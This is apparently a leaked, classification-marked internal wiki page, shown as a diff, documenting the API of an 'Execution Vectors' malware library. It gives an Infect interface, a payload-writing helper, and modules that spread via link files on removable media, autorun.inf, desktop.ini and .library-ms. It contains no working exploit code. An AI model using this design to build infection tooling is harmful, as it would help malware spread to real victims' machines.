@@ -1,0 +1,144 @@
+
+                        Execution Vectors Library
+SECRET//NOFORN
+
+Execution Vectors API
+<iframe src="https://osb-doxygen.devlan.net/executionvectors" noborder="0" width="100%" height="1000" scrolling="yes" seamless></iframe>
+
+Stash Repository: Execution Vectors
+ 
+Interface Description: 
+The interface for the Execution Vectors Library specifies an Infect function be written. The prototype is as follows:
+virtual ExVecErr Infect(WCHAR *wcPath, PVOID pvEVStruct) = 0;
+ 
+wcPath: Path to be infected (drive, directory, file, etc.)
+pvClassStruct: A per class structure that contains further configuration arguments. Since execution vectors vary more than other libraries a PVOID was chosen to allow for greater flexibility amongst modules. The User Is responsible for allocating and de-allocating all of the arguments passed to the function. Module pages will declare the structure that should be passed into pvClassStruct.
+Returns ExVecErr documented in the error code description section.
+ 
+The interface also provides a function for writing a payload to disk that can be used by any module.
+ExVecErr WritePayload(WCHAR *wcPayloadPath, LPBYTE lpbData, DWORD dwDataLen, DWORD dwFileFlags = FILE_ATTRIBUTE_NORMAL);
+ 
+wcPayloadPath: Target path of the payload (path on the target system).
+lpbData: Buffer containing the payload.
+dwDataLen:Length of the buffer containing the payload.
+dwFileFlags: File attributes flag of the payload.
+Returns ExVecErr documented in the error code description section.
+ 
+Library Conventions: 
+Naming convention of classes in the Execution Vectors library:
+
+Prefix EVExecution Vector (Execution Vector)
+Indication that the class is for Infection (Infecting a file, path, etc), or Execution (code to be implemented post execution)
+Medium of delivery to target (file, removable media, network share, etc)
+Infection label (link file, word document, pdf, trojan, etc)
+_ Crypt specifying tool/technique, abbreviated to 2-3 letters (EZC = EZCHEESE, Rap = Raptor, etc)
+
+ 
+Example:
+EVIRemovableMediaLink_EZC
+EV = Execution VectorI = Infection classRemovable Media = Execution gained by infecting removable mediaLink = Link File Exploit_EZC = EZCHEESE Exploit
+ 
+All modules should be compatible with Windows XPWindows operating system (Version) through the current version of Windows. This does not mean that all functionality be present. It does mean, however, that code should not crash the parent process of the library when running on Windows XPWindows operating system (Version) or greater.
+ 
+Execution Vector Member List:
+Removable Media Link File Execution (EVRemovableMediaLink_EZC - EZCheese)
+Removable Media Link File Exploitation with Autorun.inf (EVRemovableMediaLink_LACH - Lachesis)
+Link File Execution Utilizing Desktop.ini (EVLink_BOOM - Boomslang)
+Link File Execution Utilizing .library-ms (EVLink_RVRJ - RiverJack)
+ 
+Interface Structures:
+//Enumeration of supported system architectures
+static enum eArch : unsigned char
+{
+	x86 = 0,
+	x64 = 1
+};
+ 
+Error Code Descriptions: 
+Return Code Type For Execution Vector Library: enum ExVecErr: int.
+Error codes >= 0 are successful. The return codes will work with the SUCCESS() and FAILED() macros.
+enum ExVecErr : int
+{
+	// SUCCESS CODES: >= 0
+	// GENERIC_SUCCESS
+	eEXEVEC_SUCCESS = 0,
+	eEXEVEC_FILE_ALREADY_EXISTS				= 1,
+
+	// EVIRemovableMediaLink_EZC SUCESS
+	eEXEVECEZ_PATHS_ALREADY_GEN,						//All of the link file paths have already been generated
+
+	// EVIRemovableMediaLink_LACH		
+	eEXEVECLACH_AUTO_ENTRY_PRESENT,						//The autorun.inf already contains our entry 
+
+	// ERROR CODES: < 0
+	// GENERIC_ERROR
+	eEXEVEC_UNKNOWN							= -1,		//Unknown Failure : Unimplemented or undefined
+	eEXEVEC_INVALID_ARGS					= -2,		//Invalid Arguments
+	eEXEVEC_BAD_PATH						= -3,		//Path not valid
+	eEXEVEC_INSUFFICIENT_MEM				= -4,		//Out of memory
+	eEXEVEC_FAILED_PAYLOAD_WRITE			= -5,		//Failed to write the payload to path specified
+	eEXEVEC_INVALID_DRIVE_TYPE				= -6,		//Invalid Drive Type
+	eEXEVEC_FAILED_LINK_FILE_GEN			= -7,		//Failed to generate link files
+
+	// EVIRemovableMediaLink_EZC ERROR
+	eEXEVECEZ_INVALID_PAYLOAD_PATH			= -31,		//Path Has Space In Name
+	eEXEVECEZ_PATH_TOO_LONG					= -32,		//The path to the dll was too long
+	eEXEVECEZ_FAIL_TO_GEN_LINK_NAME			= -33,		//Failure to generate link file name
+
+	// EVIRemovableMediaLink_LACH ERROR
+	eEXEVECLACH_FAIL_AUTORUN_CREATE			= -34,		//Failed to write autorun.inf file
+
+	//EVILink_BOOM ERROR
+	eEXEVECBOOM_INI_ALREADY_EXISTS			= -35,		//Desktop.ini file already exists and the bOverwrite flag was set to FALSE
+	eEXEVECBOOM_FAILED_INI_CREATE			= -36,		//Failed to create desktop.ini file
+
+	// EVILink_RVRJ ERROR
+	eEXEVECRVRJ_FAILED_LIB_CREATE			= -37		//Failed to create *.library-ms file
+};
+ 
+Code Sample Using The Library Interface:
+ 
+ExecutionVectors *evVector = new EVIRemovableMediaLink_EZC(); 	//Replace EVIRemovableMediaLink_EZC with the module you are using
+ 
+//TODO: Create Execution Vector specific structure
+ 
+evVector->Infect(L"E:\\MyDrive\\Test", pvClassStruct);
+ 
+delete evVector;
+ 
+ 
+ 
+SECRET//NOFORN
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 SECRET
+| 5 SECRET
+| 6 SECRET
+| 7 SECRET
+| 8 SECRET
+| 9 SECRET
+| 10 SECRET
+| 11 SECRET
+| 12 SECRET
+| 13 SECRET
+| 14 SECRET
+| 15 SECRET
+| 16 SECRET
+| 17 SECRET
+| 18 SECRET
+| 19 SECRET
+| 20 SECRET
+| 21 SECRET
+| 22 SECRET
+| 23 SECRET
+| 24 SECRET
+| 25 SECRET
+| 26 SECRET
+| 27 SECRET
+| 28 SECRET
+| 29 SECRET
+|
+                    
